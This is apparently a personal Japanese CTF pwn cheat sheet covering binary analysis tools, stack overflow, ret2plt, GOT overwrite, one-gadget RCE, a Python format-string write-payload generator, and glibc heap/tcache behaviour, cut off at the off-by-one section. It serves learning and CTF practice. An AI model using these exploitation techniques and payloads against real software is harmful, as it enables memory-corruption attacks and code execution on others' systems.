<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [表層解析](#%E8%A1%A8%E5%B1%A4%E8%A7%A3%E6%9E%90)
- [動的解析](#%E5%8B%95%E7%9A%84%E8%A7%A3%E6%9E%90)
- [静的解析](#%E9%9D%99%E7%9A%84%E8%A7%A3%E6%9E%90)
  - [radare2](#radare2)
  - [gdb](#gdb)
    - [gdb-peda](#gdb-peda)
    - [gdb-pwndbg](#gdb-pwndbg)
    - [gdb-Pwndbg](#gdb-pwndbg)
    - [gdb-gef](#gdb-gef)
  - [Ghidra](#ghidra)
  - [angr](#angr)
- [exploit](#exploit)
  - [stack base BOF](#stack-base-bof)
  - [スタックアラインメント](#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%82%A2%E3%83%A9%E3%82%A4%E3%83%B3%E3%83%A1%E3%83%B3%E3%83%88)
  - [ret2plt](#ret2plt)
  - [ret2libc](#ret2libc)
  - [GOT Overwrite](#got-overwrite)
  - [gadget](#gadget)
    - [one-gadget RCE](#one-gadget-rce)
  - [format string bug](#format-string-bug)
  - [libc leak](#libc-leak)
    - [stack上のbacktraceを利用](#stack%E4%B8%8A%E3%81%AEbacktrace%E3%82%92%E5%88%A9%E7%94%A8)
  - [Heap](#heap)
    - [double free](#double-free)
    - [Use After Free](#use-after-free)
    - [tcache poisoning](#tcache-poisoning)
      - [tcacheの通常時の動作](#tcache%E3%81%AE%E9%80%9A%E5%B8%B8%E6%99%82%E3%81%AE%E5%8B%95%E4%BD%9C)
      - [tcacheの7つ埋めたあとにunsorted_binsに入る動作](#tcache%E3%81%AE7%E3%81%A4%E5%9F%8B%E3%82%81%E3%81%9F%E3%81%82%E3%81%A8%E3%81%ABunsorted_bins%E3%81%AB%E5%85%A5%E3%82%8B%E5%8B%95%E4%BD%9C)
      - [tcacheの7つ埋めたあとにfastbinsに入る動作](#tcache%E3%81%AE7%E3%81%A4%E5%9F%8B%E3%82%81%E3%81%9F%E3%81%82%E3%81%A8%E3%81%ABfastbins%E3%81%AB%E5%85%A5%E3%82%8B%E5%8B%95%E4%BD%9C)
    - [off-by-one error](#off-by-one-error)
      - [off-by-one-errorでchunk sizeを書き換えてヒープのleak](#off-by-one-error%E3%81%A7chunk-size%E3%82%92%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88%E3%81%A6%E3%83%92%E3%83%BC%E3%83%97%E3%81%AEleak)
      - [off-by-one-errorとHeap leak+tcacheを7つリンク](#off-by-one-error%E3%81%A8heap-leaktcache%E3%82%927%E3%81%A4%E3%83%AA%E3%83%B3%E3%82%AF)
    - [Heap overlap](#heap-overlap)
    - [Heap領域の上書きの利用](#heap%E9%A0%98%E5%9F%9F%E3%81%AE%E4%B8%8A%E6%9B%B8%E3%81%8D%E3%81%AE%E5%88%A9%E7%94%A8)
    - [Heap問のlibc leak](#heap%E5%95%8F%E3%81%AElibc-leak)
    - [Heapでの system("/bin/sh")実行の流れ](#heap%E3%81%A7%E3%81%AE-systembinsh%E5%AE%9F%E8%A1%8C%E3%81%AE%E6%B5%81%E3%82%8C)
    - [C++のvtableの書き換え](#c%E3%81%AEvtable%E3%81%AE%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88)
- [よく見るかたまり](#%E3%82%88%E3%81%8F%E8%A6%8B%E3%82%8B%E3%81%8B%E3%81%9F%E3%81%BE%E3%82%8A)
    - [関数の先頭](#%E9%96%A2%E6%95%B0%E3%81%AE%E5%85%88%E9%A0%AD)
    - [関数の終わり](#%E9%96%A2%E6%95%B0%E3%81%AE%E7%B5%82%E3%82%8F%E3%82%8A)
    - [main関数の状態](#main%E9%96%A2%E6%95%B0%E3%81%AE%E7%8A%B6%E6%85%8B)
    - [strcmp](#strcmp)
    - [変数](#%E5%A4%89%E6%95%B0)
    - [覚えておきたい](#%E8%A6%9A%E3%81%88%E3%81%A6%E3%81%8A%E3%81%8D%E3%81%9F%E3%81%84)
      - [方針](#%E6%96%B9%E9%87%9D)
      - [起動時の動作](#%E8%B5%B7%E5%8B%95%E6%99%82%E3%81%AE%E5%8B%95%E4%BD%9C)
      - [呼び出し規約](#%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E8%A6%8F%E7%B4%84)
      - [アドレス関係](#%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E9%96%A2%E4%BF%82)
      - [リトルエンディアン](#%E3%83%AA%E3%83%88%E3%83%AB%E3%82%A8%E3%83%B3%E3%83%87%E3%82%A3%E3%82%A2%E3%83%B3)
      - [pwntools](#pwntools)
        - [文字列操作](#%E6%96%87%E5%AD%97%E5%88%97%E6%93%8D%E4%BD%9C)
        - [通信関係](#%E9%80%9A%E4%BF%A1%E9%96%A2%E4%BF%82)
        - [ELF解析](#elf%E8%A7%A3%E6%9E%90)
        - [Rop Chain](#rop-chain)
      - [alarmのbypass](#alarm%E3%81%AEbypass)
      - [Cの関数](#c%E3%81%AE%E9%96%A2%E6%95%B0)
- [参考文献](#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE)
  - [Heap](#heap-1)
- [todo](#todo)
- [vulnhubメモ](#vulnhub%E3%83%A1%E3%83%A2)
  - [古いバージョンのLinuxのインストール](#%E5%8F%A4%E3%81%84%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E3%81%AElinux%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB)
  - [virtualbox の設定](#virtualbox-%E3%81%AE%E8%A8%AD%E5%AE%9A)
  - [install openssh](#install-openssh)
  - [install apache2](#install-apache2)
  - [install dovecot](#install-dovecot)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

## 表層解析
- file
- strings
- checksec.sh --file ./file
  - Full RELRO   
  プログラム起動時に共有ライブラリのアドレスをキャッシュ後にGOT領域をReadOnlyにする。GOT Overwriteできない
  - Partial RELRO   
  GOT領域は書き込み可能。GOT(Global Offset Table)は、共有ライブラリの関数のアドレスが保存された領域
  - No RELRO   
  GOT Overwrite可能。
  - ASLR   
  実行ファイルのスタックやヒープ、ライブラリをメモリに配置するときに、アドレスの一部をランダムに配置する   
  ランダム化されるのは、ヒープ・スタック・mmap(共有ライブラリ)で、実行ファイルが配置されるアドレスはランダム化されない。   
- `readelf -r file`   
GOT領域のアドレスを表示   
- `objdump -d -M intel -j .plt file`   
pltのアドレスを表示   
- `one_gadget libc-2.27.so`   
libcに存在する、そこに飛ばすだけでシェルが起動できるOne-gadget RCEを探す。   
前提条件などがある。   
## 動的解析
- ./file (引数)   
引数を変えてみて、入力に対して出力が一対一かどうか確認
- strace ./file (引数)   
システムコールをトレースする
- ltrace ./file (引数)   
標準ライブラリ関数をトレースする   
- `socat TCP-LISTEN:4000,reuseaddr,fork EXEC:./file 2> /dev/null &`   
- `socat TCP-LISTEN:4000,reuseaddr,fork 'system:gdbserver localhost\:5000 ./file' 2> /dev/null &`   
gdbでアタッチできるようにgdbserverで立ち上げる。   
`gdb-peda -ex 'target remote localhost:5000' -ex 'b main' -ex 'c'`   
でアタッチ。   
- `(echo -e "\xf0\xde\xbc\x9a\x78\x56\x34\x12"; cat) | ./file`   
- `python -c "print('A'*4 + '\x78\x56\x34\x12')" | ./file`   

## 静的解析
### radare2
- `radare2 ./binary`
- `afl`   
関数の一覧を表示
- `pdf @main`   
main関数を逆アセンブル   
- `pdd @ main`   
main関数をデコンパイル   
- `s main`   
main関数に移動   
- `VV`   
ヴィジュアルモードでわかりやすく表示してくれる。神。hjklで移動できる   

### gdb
- disas main   
main関数を逆アセンブル
- x/(表示する数)(メモリサイズ bhwg)(表示フォーマット six)(表示するメモリの先頭アドレス *0x08...)   
  - b:BYTE(1バイト)   
  - h:HALFWORD(2バイト)   
  - w:WORD(4バイト)   
  - g:GIANTWORD(8バイト)   
  - s:文字列   
  - i:命令   
  - x:16進数   
  - 例) `x /4wx $rbp-0x90`   
  rbp-0x90のアドレスのメモリ上の値を表示   
  - 例) `x /4wi main+11`,`x /4wi $rip`   
  指定したアドレスから4つ分の命令を表示
- アドレス確認   
   - bt   
   `__libc_start_main`のアドレスを確認 (正確には__libc_stat_main+231など)
   - p system   
   `__libc_system`のアドレスを確認   
   - p &main_arena   
   main_arenaのアドレスを確認   
   - vmmap   
   ```txt
   0x00602000         0x00623000         rw-p	[heap]
   0x00007ffff79e4000 0x00007ffff7bcb000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
   ```
   libc_baseが`0x00007ffff79e4000`とわかる   
 - メモリの書き換え   
   - `set *0x12345678=0x1234`   
   - `set *(char *)0x1233456=0x12`   
   バイト単位で書き換えられる   
#### gdb-peda 
- `gdb-peda ./file`   
- `pdisas main`
色付きで逆アセンブルして見やすい。   
- `nextcall`   
次のcallまで処理を進めてくれる   
- `tel $rbp-8*4 5`   
わかりやすくメモリの状態を表示してくれる   
- `vmmap`   
メモリ内の大体を表示   
- `pattc 200`      
- `patto AAAJ`   
- `dumprop`   
ropに使える、直後にretの存在する命令を探す   
#### gdb-pwndbg
- `gdb-pendbg ./file`   
- `heap`   
- `bins`   
- `arena`   
https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md   
#### gdb-Pwndbg
- `gdb-Pwndbg ./file`   
- `heapinfo`   
https://github.com/scwuaptx/Pwngdb   
#### gdb-gef
- `gdb-gef ./file`   
https://github.com/hugsy/gef   

### Ghidra
- `./ghirdaRun`   
でGhidraを起動。
- `[File]` -> `[import file]`でbinaryをインポート   
- `[Symbol Tree]`(左真ん中) -> `[Functions]`で関数を確認。ダブルクリックでそこに移動。   
- `[Decompile]`(右下) でコンパイル結果を表示
### angr
以下でInstall   
```txt
root@tomoki-VirtualBox:/opt# cd angr/
root@tomoki-VirtualBox:/opt/angr# virtualenv ENV
root@tomoki-VirtualBox:/opt/angr# . ENV/bin/activate
(ENV) root@tomoki-VirtualBox:/opt/angr# pip3 install angr
(ENV) root@tomoki-VirtualBox:/opt/angr# pip3 install -U protobuf
```
`(ENV) root@tomoki-VirtualBox:/opt/angr# python3 /home/tomoki/environment/CTF-writeup/ctf4b-2020/mask/solver-angr.py 
`   
でangrスクリプトを実行して、解析してフラグを表示。   
以下、angrのテンプレート。

```python
import angr
from claripy import *

# バイナリのパスを指定
proj = angr.Project('/home/tomoki/environment/CTF-writeup/ctf4b-2020/mask/mask')

# 8*40 でフラグの最大を40バイトに指定?(これがないと動かなかった)
sym_arg = BVS('sym_arg',8*40)

# mask というファイル名を指定
# state = proj.factory.entry_state()  でもyakisobaはいけた
argv=['mask',sym_arg]
state = proj.factory.entry_state(args=argv)
sm = proj.factory.simgr(state)

# find に Corrent  avoid に wrong という文字列の存在するアドレスを指定
# |      ||   0x000006d2      488d3d2e0a00.  lea rdi, str.Correct        ; 0x1107 ; "Correct!" ; const char *s
# radare2 の 0x6d2 + 0x400000 = 0x4006d2 などとしてアドレスを計算する
sm.explore(find=0x4012cf,avoid={0x4012dd,0x4011a9})

if sm.found:
    for i in sm.found:
        # yakisobaは以下で表示できた
        #print(i.posix.dumps(0))
        # これじゃないとフラグが出なかった
        print(i.solver.eval(sym_arg,cast_to=bytes).decode('utf-8','ignore'))

```
## exploit
### stack base BOF
- `socat TCP-LISTEN:4000,reuseaddr,fork EXEC:./file 2> /dev/null &`   
- `(echo -e "\xf0\xde\xbc\x9a\x78\x56\x34\x12"; cat) | ./file`   
- `python -c "print('A'*4 + '\x78\x56\x34\x12')" | ./file`   
### スタックアラインメント
x86-64の場合、関数を呼び出すときには、`RSP`は必ず16の倍数のアドレスにいなければならない。   
リターンアドレスを書き換えて別の関数を呼び出す際に考慮する必要がある。   
もしそうでない場合、`ret`を入れたり、`push rbp`を無視して16の倍数にそろえる。 
以下は`ret`命令のアドレス`0x4007f0`をFunc1_ret領域に上書きした場合の動作。   
```txt
  4007f0:	c3                   	retq   
overW_ret = 0x4007f0
func_addr = win関数のアドレス

  ret 直前       ->       ret 直後           ->          ret gadget後
RIP = ret命令のアドレス  RIP = 0x4007f0                 RIP = win関数のアドレス
(Low)
|         |             |         |                    |         |
|   ...   |             |   ...   |                    |   ...   |
|   100h  |             |   100h  |                    |   100h  |
|   ...   |             |   ...   |                    |   ...   |
|saved_ebp| __ esp      |saved_ebp|                    |saved_ebp|
|overW_ret| (書き換えた) |overW_ret| (書き換えた) __ esp |overW_ret| (書き換えた)
|func_addr| (書き換えた) |func_addr| (書き換えた)        |func_addr| (書き換えた) __ esp
|  arg2   |             |  arg2   |                    |  arg2   |
|   ...   | __ ebp      |   ...   | __ ebp             |   ...   | __ ebp
|         |             |         |                    |         |
(High)
```
### ret2plt
`printf@plt`とかをリターンアドレスをにセットすると、動的リンクされたライブラリのアドレスを解決してライブラリ内の関数(printf)を実行してくれる。   
libc_printfを知っている必要がない！   
system関数はpltにはない。printf@pltをよく使う？   
`objdump  -d -M intel -j .plt  chall`   
でpltの一覧を取得。   
pltのアドレスは実行ファイル内のアドレスなので有効(ASLR関係ない)。
```txt
# x86
    ret前
|           |
|   100h    |
| saved_ebp | __ esp
| ret_addr  | <- printf@plt
|   arg1    | <- 0x42424242 (printf呼び出し後の偽のリターンアドレス)
|   arg2    | <- buffer変数のアドレス
|   ....    |
|           | __ ebp
|           |

# x86-64
    ret前
|           |
|   100h    |
| saved_rbp | __ rsp
| ret_addr  | <- pop rdi;retへのアドレス
|   arg1    | <- rdiに入れたいGOT printfのアドレス (libc_printfが書き込まれている)
|   arg2    | <- puts@plt
|           | <- addr_main (puts関数のリターンアドレス)
|   ....    |
|           | __ rbp
|           |

```
### ret2libc
動的リンクされたライブラリのアドレスをリターンアドレスにセットして、呼び出す。   
ASLRによって動的リンクされたライブラリはランダム化されるため、libc leakが前提条件。   

### GOT Overwrite
動的リンクされた関数などのアドレステーブルのGOT領域に書いてある関数のアドレスを上書き。   
.pltはGOT領域のアドレステーブルを参照して関数のアドレスを取得する。   
No RELRO, Partial RELEROの場合に有効。   
`readelf -r file`   
で調べる。書かれている関数のアドレスは隣接している。   
```txt
再配置セクション '.rela.plt' at offset 0x4b0 contains 7 entries:
  オフセット      情報           型             シンボル値    シンボル名 + 加数
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 setbuf@GLIBC_2.2.5 + 0
000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0
000000601030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000601038  000700000007 R_X86_64_JUMP_SLO 0000000000000000 malloc@GLIBC_2.2.5 + 0
000000601040  000800000007 R_X86_64_JUMP_SLO 0000000000000000 atol@GLIBC_2.2.5 + 0
000000601048  000900000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
```
例）exitのGOTを書き換えて、mainに飛ばす    
```txt
初回
call exit -> exit@plt+0 ->[exit GOT] -> exit@plt+6 -> .plt -> libc_exit

2回目以降
call exit -> exit@plt+0 ->[exit GOT] -> libc_exit
--------------------------------------------------------------
exit初回呼び出し前

[exit GOT]
000000601050: 4006d6  <- exit@plt+6をはじめは指している

00000000004006d0 <exit@plt>:
  4006d0:	ff 25 7a 09 20 00    	jmp    QWORD PTR [rip+0x20097a]        # 601050 <exit@GLIBC_2.2.5> <- exit GOTを指している
  4006d6:	68 07 00 00 00       	push   0x7
  4006db:	e9 70 ff ff ff       	jmp    400650 <.plt>   <- 初回はこの処理をして、exitGOTにlibcのアドレスを書きこむ

exitは一度もまだ呼ばれていないのでexitのGOTにはexit@pltのアドレス解決コードへのアドレスが書かれている。
--------------------------------------------------------------
2回目以降のexit呼び出し前

[exit GOT]
000000601050: 0x7ffff7a27120  <- libc_exitが書き込まれている！！

00000000004006d0 <exit@plt>:
  4006d0:	ff 25 7a 09 20 00    	jmp    QWORD PTR [rip+0x20097a]        # 601050 <exit@GLIBC_2.2.5>  <- exit GOTを指している
  4006d6:	68 07 00 00 00       	push   0x7
  4006db:	e9 70 ff ff ff       	jmp    400650 <.plt>   <- 2回目以降はこの処理は入らない

```
### gadget
x86-64の場合は、引数はrdi引数から始まるため、スタックにしか書き込めない場合は`pop rdi;ret`によってRDIレジスタに引数にしたい値を書き込むことになる。
#### one-gadget RCE
libcに存在する、そこに実行を移すだけで`/bin/sh`が起動するガジェット。   
それぞれ制約があるが、それほど気にせずに全部試してダメだったら対応すればいいらしい。   
```txt
takabaya-shi@takabayashi-VirtualBox:~/$ one_gadget libc-2.27.so 
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
takabaya-shi@takabayashi-VirtualBox:~/$
```
### format string bug
以下のようにフォーマットが指定されていない場合に有効。   
```txt
printf(buf)
```
また、ret2pltなどでprintf関数を呼び出した際にも有効！！   
`%p`の場所は、x64の場合は7まではrsi,rdx,..のレジスタの内容で、8以降rspになるらしいので、`sub rsp YY`と`rbp-0xXX`を対応させて逆算するらしい。   
- `%p`   
スタック上のデータをvoid\*型として16進数で表示   
- `%n$p`   
スタック上の何番目のデータをvoid\*型として16進数で表示するかを指定することができる   
- `%x`   
スタック上にある値をそのまま出力する   
- `%d`   
スタック上にある値を整数として出力する   
`%4d`として出力幅を指定すると、4バイトになるように足りない分は空白で埋めて表示する。   
- `%s`   
スタック上にある値をポインタとして読み込んで表示   
- `%c`   
文字を出力する書式指定子。でもなんか0x41414141みたいなものを表示できた時もある(%pと入れ替わってるみたいな感じになってた…???)   
```txt
>>> conn.sendline("N"*8 + ",%c"*30) <- x86-64の場合は8バイト分入力すると8個目に0x4141414141414141がでた
>>> conn.recvline()
'AAAAAAAA,0x7fffffffdd10,(nil),0x7ffff7af4081,0x7ffff7dd18c0,0x7ffff7fe14c0,(nil),0x100,0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0xa7025,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil)\n'

>>> conn.sendline("N"*8 + ",%8$c"+",%9$c"+",%10$c"+",%24$c")
>>> conn.recvline()
'AAAAAAAA,0x4141414141414141,0x39252c702438252c,0x70243031252c7024,(nil)\n'
```
- `%n`   
printfが呼ばれてから%nを見つけるまでに出力された文字数を引数のポインタに書き込む   
既知の任意のアドレスに書き込むことができる。   
入力した文字列に対応する引数が何番目かを特定して、任意のアドレス(最後の方に呼ばれる関数のGOT領域が多い)にone-gadget-rceなどを書き込む。   
その際に、libcのアドレスが必要なため、以下の手順を取るのが定石？   
- [1] スタック上にあるlibc_start_mainのアドレスをリーク (1回目のFSB)   
- [2] 最後に呼ばれる関数(exitなど)をmainに書き換えてループ　(1回目のFSB)   
- [3] 最後に呼ばれる関数(exitなど)をone-gadget-rceに書き換える (2回目のFSB)   
```txt
0x7fffffff_12345678に書き込みたい場合、
    \x78\x56\x34\x12\xff\xff\xff\x7f%9$n
とする。

    \x78\x56\x34\x12\xff\xff\xff\x7f%9$c
とすると、
0x7fffffff12345678が引数として設定されて、このアドレスに書き込むことができるようになる！

%43$nとかで、スタック上のリターンアドレスに書き込むことはできない。
スタック上のリターンアドレスを%43$cでleakできたとしても、このアドレスを引数にとることはできない？？   
-> できる！が、Partial RELROの場合はlibc_start_mainには書き込めない！！
(仮にできたとしても、スタック上じゃなくてlibc_start_mainのアドレスに書き込むことになるので良くなさそう)
-> スタック上に、スタック上のポインタがあれば、任意のアドレスに書き込める！
例）
0x7fffffffde90 | 0x7fffffffdff0
       ~
0x7fffffffdff0 | 0
となっている場合、2回のFSBで任意のアドレスに書き込める。

[1] 0x7fffffffdff0をprintfのポインタの引数として、このアドレスに0xdeadbeefを書き込む
[2] 0xdeadbeefをprintfのポインタの引数として、このアドレスに任意の値を書き込める！
```
- `%hn`   
1バイトだけ書き込む   
```python
# 参考 https://kusano-k.hatenadiary.com/entry/20140302/1393781714

from sys import *
from struct import *
T = [
    (0x080497fc, ord('h')),
    (0x080497fd, ord('a')),
    (0x080497fe, ord('c')),
    (0x080497ff, ord('k')),
]

# 書き込む文字列の先頭がprintfのoffset+1番目の引数
offset = 4

code = "".join(pack("I",t[0]) for t in T)  # "I"にすると4bytes, "l"にすると8bytes
#"I" '\xfc\x97\x04\x00\xfd\x97\x84\x00\xfe\x97\x04\x08\xff\x97\x04\x08'
#"l" '\xfc\x97\x04\x00\x00\x00\x00\x00\xfd\x97\x84\x00\x00\x00\x00\x00\xfe\x97\x04\x08\x00\x00\x00\x00\xff\x97\x04\x08\x00\x00\x00\x00'

# 出力した文字数
n = len(code)

for i in range(len(T)):
    l = (T[i][1]-n-1)%256+1
    code += "%{0}c%{1}$hhn".format(l, offset+i)
    n += l

print >>stderr, "code:", repr(code)
print code
# '\xfc\x97\x04\x00\xfd\x97\x84\x00\xfe\x97\x04\x08\xff\x97\x04\x08%88c%4$hhn%249c%5$hhn%2c%6$hhn%8c%7$hhn'
```
### libc leak
#### stack上のbacktraceを利用
stack上にはバックトレースという、エラー時にどの関数を呼んだのかをわかるようにするための情報が保存される。   
これをret2pltなどのprintfのFSBでleakする。   
```txt
gdb-peda$ bt
#0  0x0000000000400818 in main ()
#1  0x00007ffff7a05b97 in __libc_start_main (main=0x40079e <main>, argc=0x1, 
    argv=0x7fffffffdf88, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffdf78) at ../csu/libc-start.c:310
#2  0x000000000040061a in _start ()
gdb-peda$ tel 0x00007ffff7a05b97 1
0000| 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)

libc_start_main = 0x7ffff7a05b97 -231
libc_base = libc_start_main - offset_libc_start
```

### Heap
#### double free
libc2.27より前のtcacheにはdouble freeのチェックがなく、任意のアドレスに任意の値を書き込むことができる！   
```txt

```
#### Use After Free
#### tcache poisoning
##### tcacheの通常時の動作
[1] 0x10サイズをmalloc(content)して、`AAAAAAAABBBBBBBB`を書き込む。   
[2] 0x20サイズをmalloc(content)して、`DDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG`を書き込む。   
```txt
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE   <- ox20サイズのチャンクが作成された
Addr: 0x555555757250              0x21の1はPREV_INUSEで直前のチャンク(0x251)が既に使われていることを示す
Size: 0x21

Allocated chunk | PREV_INUSE   <- 0x30サイズのチャンクが作成された
Addr: 0x555555757270              0x31の1はPREV_INUSEで直前のチャンク(0x21)が既に使われていることを示す　
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg> bins
tcachebins                <- free(content)されていないのでtcacheは存在しない
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021  <- 0x10サイズのchunkのtopのアドレス
0x555555757260:	0x4141414141414141	0x4242424242424242  <- 0x10サイズのmalloc(content)が返したアドレス
0x555555757270:	0x0000000000000000	0x0000000000000031  <- 0x20サイズのchunkのtopのアドレス
0x555555757280:	0x4444444444444444	0x4545454545454545  <- 0x20サイズのmalloc(content)が返したアドレス
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> 
```
##### tcacheの7つ埋めたあとにunsorted_binsに入る動作
```txt
for i in range(8):
    store(str(i),"a"*0x80) <- 0x91sizeのchunkを8個確保 
store("0","A")             <- [*] 0x20sizeのchunkを最後にいれる！　これが超大事！！
for i in range(7):
    delete(str(i))         <- [1] これを実行後。7つ分free
delete("7")                <- [2] これを実行後。8個目をfree
---------------------------------------------------------------------------------
[1]

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x0

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 <- 8個目のchunk まだfreeされていない
0x555555757650:	0x6161616161616161	0x6161616161616161
       ~                 ~                   ~
0x5555557576c0:	0x6161616161616161	0x6161616161616161
0x5555557576d0:	0x0000000000000000	0x0000000000000021 <- 0x21sizeのchunk
0x5555557576e0:	0x0000000041414141	0x0000000000000000
0x5555557576f0:	0x0000000000000000	0x0000000000020911 <- topのchunk
0x555555757700:	0x0000000000000000	0x0000000000000000

---------------------------------------------------------------------------------
[2] delete("7")を実行後 (8個目をfree後)

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757640 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757640 /* '@vuUUU' */

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 <- 8個目のchunkがfreeされて、fd,bkのmain_arenaのアドレスが！
0x555555757650:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757660:	0x6161616161616161	0x6161616161616161
       ~                 ~                   ~ 
0x5555557576c0:	0x6161616161616161	0x6161616161616161
0x5555557576d0:	0x0000000000000090	0x0000000000000020 <- unsorted_binsに登録される際に0x21から0x20に上書き 
0x5555557576e0:	0x0000000041414141	0x0000000000000000    (8個目のchunkがfreeされた＝直前のchunkは使用されていない)
0x5555557576f0:	0x0000000000000000	0x0000000000020911 <- top
0x555555757700:	0x0000000000000000	0x0000000000000000

freeする8個目のchunkの直後のchunk(0x21)はtopではない
-> 直後のchunk(0x21)は使用中である
     -> 直後のchunk(0x21)のPREV_INUSEを0に (0x20に更新)
        直後のchunk(0x21)のPREV_SIZEを更新 (0x90を上書きする)
        
もし、直後のchunkがtopなら、unsorted_binsには登録されずに、topとconsolidateしtopを更新
```
##### tcacheの7つ埋めたあとにfastbinsに入る動作
```txt
-------------------------------------------------------------
free(content)を7回繰り返した後

pwndbg> bins
tcachebins
0x30 [  7]: 0x555555757280 ◂— 0x555555757280       <- 7回free(content)されておりリンクが最大の7個ある
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021
0x555555757260:	0x4141414141414141	0x4242424242424242
0x555555757270:	0x0000000000000000	0x0000000000000031
0x555555757280:	0x0000555555757280	0x4545454545454545 <- tcache[0x30]に入っている値(アドレス)
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x21

Free chunk (tcache) | PREV_INUSE                     <- tcacheに積まれる
Addr: 0x555555757270
Size: 0x31
fd: 0x555555757280                                   <- fdはtcache[0x30]の値で上書きされている

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg>

----------------------------------------------------------------------------
8回目の0x30サイズのfree(content)後

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555757250
Size: 0x21

Free chunk (fastbins) | PREV_INUSE                   <- fastbinsに積まれた！ 
Addr: 0x555555757270                                 <- tcache[0x30]より0x10小さいアドレス
Size: 0x31
fd: 0x00

Top chunk | PREV_INUSE
Addr: 0x5555557572a0
Size: 0x20d61

pwndbg> bins
tcachebins
0x30 [  7]: 0x555555757280 ◂— 0x0               <- tcache[0x30]は7つ分を使い切った
fastbins
0x20: 0x0
0x30: 0x555555757270 ◂— 0x0                     <- 8個目は0x30のサイズが小さいのでfastbinsに積まれる
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000021
0x555555757260:	0x4141414141414141	0x4242424242424242
0x555555757270:	0x0000000000000000	0x0000000000000031  <- fastbins[0x30]の値（アドレス）
0x555555757280:	0x0000000000000000	0x4545454545454545  <- tcache[0x30]の値（アドレス）
0x555555757290:	0x4646464646464646	0x4747474747474747
0x5555557572a0:	0x0000000000000000	0x0000000000020d61
pwndbg> 
```
#### off-by-one error
read() で指定文字列を上限に読み込んだあと、ヌルバイト埋めが 1byte だけ溢れる脆弱性。   
Heap問でチャンクサイズを書き換えるのに有効。頻出？   
例)   
